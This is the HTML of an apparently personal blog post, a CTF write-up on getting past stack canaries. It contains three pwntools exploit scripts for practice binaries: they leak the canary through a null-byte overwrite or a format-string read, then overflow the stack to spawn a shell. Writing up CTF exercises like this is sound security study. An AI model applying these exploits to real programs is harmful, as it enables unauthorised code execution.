@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="This article will record some poc for pwn bypass.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn bypass">
+<meta property="og:url" content="http://example.com/2022/10/25/pwn-bypass/index.html">
+<meta property="og:site_name" content="书鱼">
+<meta property="og:description" content="This article will record some poc for pwn bypass.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/10/25/pwn-bypass/1.png">
+<meta property="og:image" content="http://example.com/2022/10/25/pwn-bypass/2.png">
+<meta property="og:image" content="http://example.com/2022/10/25/pwn-bypass/4.png">
+<meta property="og:image" content="http://example.com/2022/10/25/pwn-bypass/3.png">
+<meta property="og:image" content="http://example.com/2022/10/25/pwn-bypass/5.png">
+<meta property="article:published_time" content="2022-10-25T13:15:16.000Z">
+<meta property="article:modified_time" content="2023-02-26T08:45:31.730Z">
+<meta property="article:author" content="Bkfish">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/10/25/pwn-bypass/1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>pwn bypass</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/10/24/buuoj-pwn/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/10/25/pwn-bypass/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/10/25/pwn-bypass/&text=pwn bypass"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/10/25/pwn-bypass/&title=pwn bypass"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/10/25/pwn-bypass/&is_video=false&description=pwn bypass"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=pwn bypass&body=Check out this article: http://example.com/2022/10/25/pwn-bypass/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/10/25/pwn-bypass/&title=pwn bypass"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/10/25/pwn-bypass/&title=pwn bypass"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/10/25/pwn-bypass/&title=pwn bypass"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/10/25/pwn-bypass/&title=pwn bypass"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/10/25/pwn-bypass/&name=pwn bypass&description=&lt;p&gt;This article will record some poc for pwn bypass.&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/10/25/pwn-bypass/&t=pwn bypass"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81Canary"><span class="toc-number">1.</span> <span class="toc-text">1、Canary</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1%E3%80%81OverWrite-0x00"><span class="toc-number">1.1.</span> <span class="toc-text">1.1、OverWrite 0x00</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Q1%E3%80%81Shanghai-Medical-CTF-pwn"><span class="toc-number">1.1.1.</span> <span class="toc-text">Q1、Shanghai Medical CTF pwn</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Q2%E3%80%81bugku-canary"><span class="toc-number">1.1.2.</span> <span class="toc-text">Q2、bugku canary</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2%E3%80%81Fmt"><span class="toc-number">1.2.</span> <span class="toc-text">1.2、Fmt</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Q1%E3%80%81Adworld-Mary-Morton"><span class="toc-number">1.2.1.</span> <span class="toc-text">Q1、Adworld_Mary_Morton</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        pwn bypass
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Bkfish</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-10-25T13:15:16.000Z" class="dt-published" itemprop="datePublished">2022-10-25</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Pwn/">Pwn</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>This article will record some poc for pwn bypass.</p>
+<span id="more"></span>
+
+<!-- toc -->
+
+<h2 id="1、Canary"><a href="#1、Canary" class="headerlink" title="1、Canary"></a>1、Canary</h2><p>canary like a cookie on the ebp with random bytes</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">       +-----------------+</span><br><span class="line">       |     retaddr     |</span><br><span class="line">       +-----------------+</span><br><span class="line">       |     saved ebp   |</span><br><span class="line">ebp---&gt;+-----------------+</span><br><span class="line">       |     canary      |</span><br><span class="line">       +-----------------+</span><br><span class="line">       |                 |</span><br><span class="line">       |                 |</span><br><span class="line">       |                 |</span><br><span class="line">       |                 |</span><br><span class="line">       |                 |</span><br><span class="line">       |                 |</span><br><span class="line">esp---&gt;+-----------------+</span><br></pre></td></tr></table></figure>
+<p>after function call retn ,system will check canary has been modified,it look likes cookie.<br>so if we want stack overflow ,we should record canary .</p>
+<h3 id="1-1、OverWrite-0x00"><a href="#1-1、OverWrite-0x00" class="headerlink" title="1.1、OverWrite 0x00"></a>1.1、OverWrite 0x00</h3><p>canary ends with 0x00 in case of read by function “printf” or “read”,so we can over write 0x00 to leak canary</p>
+<h4 id="Q1、Shanghai-Medical-CTF-pwn"><a href="#Q1、Shanghai-Medical-CTF-pwn" class="headerlink" title="Q1、Shanghai Medical CTF pwn"></a>Q1、Shanghai Medical CTF pwn</h4><p><a href="shyl_pwn" title="shyl_pwn">attachment </a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">checksec pwn</span><br><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/10/25/pwn-bypass/1.png"></p>
+<p>in function format we can record canary,then use function overflow to stackoverflow</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">payload1=<span class="string">b&quot;a&quot;</span>*<span class="number">0x109</span></span><br><span class="line">sh.recvuntil(<span class="string">&quot;enter:\n&quot;</span>)</span><br><span class="line">sh.send(<span class="string">&quot;2\n&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;input: \n&quot;</span>)</span><br><span class="line">sh.send(payload1)</span><br><span class="line">canary=u64(<span class="string">b&quot;\x00&quot;</span>+sh.recv()[<span class="number">0x109</span>:<span class="number">0x110</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line">sh.send(<span class="string">&quot;1\n&quot;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;input: \n&quot;</span>)</span><br><span class="line">succ_addr=<span class="number">0x0000000000401320</span></span><br><span class="line">payload2=<span class="string">b&quot;a&quot;</span>*<span class="number">0x108</span>+p64(canary)+p64(<span class="number">0</span>)+p64(succ_addr)</span><br><span class="line">sh.send(payload2)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;enter:\n&quot;</span>)</span><br><span class="line">sh.send(<span class="string">&quot;2333\n&quot;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h4 id="Q2、bugku-canary"><a href="#Q2、bugku-canary" class="headerlink" title="Q2、bugku canary"></a>Q2、bugku canary</h4><p><a href="bugkucanary" title="bugkucanary">attachment </a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">checksec bugkucanary</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="/2022/10/25/pwn-bypass/2.png"><br>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal=[&#x27;gnome-terminal&#x27;,&#x27;-x&#x27;,&#x27;sh&#x27;,&#x27;-c&#x27;]</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=process(<span class="string">&quot;./bugkucanary&quot;</span>)</span><br><span class="line"><span class="comment">#pwnlib.gdb.attach(sh,&#x27;b *0x00000000004008E0&#x27;)</span></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x240</span>-<span class="number">8</span>))</span><br><span class="line"><span class="comment">#sh.send(b&#x27;a&#x27;*(0x240-8+1))</span></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x240</span>-<span class="number">8</span>)+<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">canary=<span class="string">b&#x27;\x00&#x27;</span>+sh.recv()[<span class="number">0</span>:<span class="number">7</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(u64(canary)))</span><br><span class="line"></span><br><span class="line">call_system=<span class="number">0x000000000040080C</span></span><br><span class="line">bin_sh=<span class="number">0x0000000000601068</span></span><br><span class="line">pop_rdi=<span class="number">0x0000000000400963</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*(<span class="number">0x210</span>-<span class="number">0x8</span>)+canary+<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>+p64(pop_rdi)+p64(bin_sh)+p64(call_system)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.recv()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-2、Fmt"><a href="#1-2、Fmt" class="headerlink" title="1.2、Fmt"></a>1.2、Fmt</h3><p>some times we can use %pad$p to read canary</p>
+<h4 id="Q1、Adworld-Mary-Morton"><a href="#Q1、Adworld-Mary-Morton" class="headerlink" title="Q1、Adworld_Mary_Morton"></a>Q1、Adworld_Mary_Morton</h4><p><a href="Adworld_Mary_Morton" title="Adworld_Mary_Morton">attachment </a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">checksec Adworld_Mary_Morton</span><br><span class="line"></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<p>in choice two,is has a fmt hole,and canary position is (0x90-0x8)&#x2F;8+6</p>
+<p><img src="/2022/10/25/pwn-bypass/4.png"></p>
+<p>and choice one has a stackoverflow hole</p>
+<p><img src="/2022/10/25/pwn-bypass/3.png"></p>
+<p>so first we use fmt to leak canary ,than use stackoverflow to getshell.<br>by the way ,the overflow size can just only 0x100-0x90,but a backdoor function is given</p>
+<p><img src="/2022/10/25/pwn-bypass/5.png"><br>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#context.terminal=[&#x27;gnome-terminal&#x27;,&#x27;-x&#x27;,&#x27;sh&#x27;,&#x27;-c&#x27;]</span></span><br><span class="line">sh=process(<span class="string">&quot;./Adworld_Mary_Morton&quot;</span>)</span><br><span class="line"><span class="comment">#pwnlib.gdb.attach(sh,&#x27;b *0x0000000000400944&#x27;)</span></span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">sh.sendline(<span class="string">&quot;%23$p&quot;</span>)</span><br><span class="line">canary=sh.recvuntil(<span class="string">&quot;00&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(canary)</span><br><span class="line">canary=<span class="built_in">int</span>(canary,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">success_addr=<span class="number">0x00000000004008DE</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*(<span class="number">0x90</span>-<span class="number">8</span>)+p64(canary)+<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>+p64(success_addr)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(sh.recv())</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E3%80%81Canary"><span class="toc-number">1.</span> <span class="toc-text">1、Canary</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1%E3%80%81OverWrite-0x00"><span class="toc-number">1.1.</span> <span class="toc-text">1.1、OverWrite 0x00</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Q1%E3%80%81Shanghai-Medical-CTF-pwn"><span class="toc-number">1.1.1.</span> <span class="toc-text">Q1、Shanghai Medical CTF pwn</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Q2%E3%80%81bugku-canary"><span class="toc-number">1.1.2.</span> <span class="toc-text">Q2、bugku canary</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2%E3%80%81Fmt"><span class="toc-number">1.2.</span> <span class="toc-text">1.2、Fmt</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Q1%E3%80%81Adworld-Mary-Morton"><span class="toc-number">1.2.1.</span> <span class="toc-text">Q1、Adworld_Mary_Morton</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/10/25/pwn-bypass/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/10/25/pwn-bypass/&text=pwn bypass"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/10/25/pwn-bypass/&title=pwn bypass"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/10/25/pwn-bypass/&is_video=false&description=pwn bypass"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=pwn bypass&body=Check out this article: http://example.com/2022/10/25/pwn-bypass/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/10/25/pwn-bypass/&title=pwn bypass"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/10/25/pwn-bypass/&title=pwn bypass"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/10/25/pwn-bypass/&title=pwn bypass"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/10/25/pwn-bypass/&title=pwn bypass"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/10/25/pwn-bypass/&name=pwn bypass&description=&lt;p&gt;This article will record some poc for pwn bypass.&lt;/p&gt;"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/10/25/pwn-bypass/&t=pwn bypass"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    Bkfish
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
